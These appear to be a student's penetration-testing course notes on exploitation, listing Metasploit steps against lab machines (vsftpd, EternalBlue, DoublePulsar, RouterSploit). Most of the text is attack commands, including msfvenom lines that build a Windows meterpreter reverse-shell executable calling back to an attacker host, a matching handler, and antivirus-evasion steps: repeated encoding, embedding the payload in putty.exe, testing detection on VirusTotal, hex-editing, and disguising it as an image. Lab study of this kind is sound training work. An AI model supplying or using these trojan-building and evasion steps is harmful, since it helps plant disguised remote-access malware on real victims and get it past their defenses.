# Exploitation and gaining access

Exploitation and gaining access refer to the techniques and methods used to exploit vulnerabilities
in computer systems or networks in order to gain unauthorized access or control. This can involve
various activities such as finding and exploiting software vulnerabilities, bypassing security measures,
or using social engineering techniques to trick users into revealing sensitive information. The ultimate
goal is to gain unauthorized access to a system or network for malicious purposes.

- payload : A payload is the actual code or software that is used to exploit a vulnerability and gain access to a system or network. This can include malware, remote access tools, or other types of malicious software.
- vulnerability : A vulnerability is a weakness or flaw in a system or network that can be exploited by an attacker to gain unauthorized access or control. Vulnerabilities can exist in software, hardware, or network configurations, and can be exploited through various means such as code execution, privilege escalation, or data exfiltration.
- reverse shell : A reverse shell is a type of shell that allows an attacker to gain remote access to a system or network. This is typically achieved by exploiting a vulnerability and then using a payload to establish a connection back to the attacker's system, allowing them to execute commands and interact with the compromised system.
- bind shell: A bind shell is a type of shell that allows an attacker to gain remote access to a system or network. This is typically achieved by exploiting a vulnerability and then using a payload to establish a connection from the compromised system to the attacker's system, allowing them to execute commands and interact with the compromised system.

### Metasploit Framework

- cd /usr/share/metasploit-framework : to navigate to the metasploit directory
- cd modules: to see 7 modules of this framework
- msfconsole : to start it
- show payloads : shows all of the available payloads
- show exploits
- use [module-name]: e.g use exploit/windows/...
- show info & show options
- set [parameter] [ip]

### exploit -> metasploitable

- start metasploitable
- check ifconfig
- sudo nmap -sV [ip of metasploitable]
- searchsploit [package-with-version]
- msfconsole
- msf6 > search vsftpd
- msf6 > use exploit/unix/rest..
- show info
- show options
- set RHOSTS [metasploitable-ip]
- show payloads
- show targets
- show options
- exploit : enter -> we got control of the terminal of metaslpoitable machine (type ls)

### misconfig -> bindshell exploitation

- nc -h
- nc (ip) (port)

### information disclosure -> telnet

- telnet (ip)

### software vulnerability -> samba exploit

### attacking SSH -> brute force attack

- search ssh
- ssh username@ip

### meterpreter shell

- napmap scan -> msf console -> search -> searchploit

### windows - 7 exploitation

- download windows 7 iso
- storage -> controller -> chose iso file
- nat -> nat network
- disable firewall

### eternal blue attack - win7

- sudo nmap -sS (target ip)
- msfconsole
- search eternalblue
- use auxiliary module
- set RHOSTS (target ip)
- use exploit module
- show options

### double pulsar attack - win exploit

- sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
- sudo su
- download python 2 msi
- sudo su
- wine msiexec /i python-2.7.14.msi
- sudo su -> ls -la
- download eternal blue double pulsar - github
- follow any article to do this attack

### bluekeep vulnerability - win exploit

### routersploit

- search routersploit -github
- follow installation guid
- netstat -nr -> gateway ip
- router default credentials -> search
- nmap -sT (router ip)
- telnet (ip)

### smbgost cve 202-0796 - windows 10 exploit

- crashing and exploiting remotely

### gaining access (virus, trojan)

- msfvenom -h
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(kali ip) LPORT=4444 -f exe -o (filename).exe
- msfconsole
- use exploit/multi/handler
- show options
- set payload windows/x64/meterpreter/reverse_tcp
- set LHOST (kali ip)
- set LPORT 4444
- run

### advance msfvenom

- msfvenom -h
- msfvenom --list formats
- virustotal -> to check if the file is detected by antivirus
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(kali ip) LPORT=4444 -a x64 -e x64/24tto-dekiru -i 15 --platform windows -n 500 -f exe -o shell.exe
- msfvenom ... -x putty.exe -f exe -o shell.exe

### generating powershell payload using veil

- sudo su
- apt-get install veil
- veil
- use 1
- dist
- use 22
- set SLEEP 20
- set LHOST (kali ip)
- generate
- download B2E -github
- wine bat...exe
- msfconsole
- resource (paste)

### the fatrat payload creation

- download from github

### Hex editor and antivirus

- use the html file
- md5sum shell.exe
- hexedior shell.exe
- ctrl+o ctrl+x

### masking payload (image)

- follow articles
- create ico file
- use windows archive
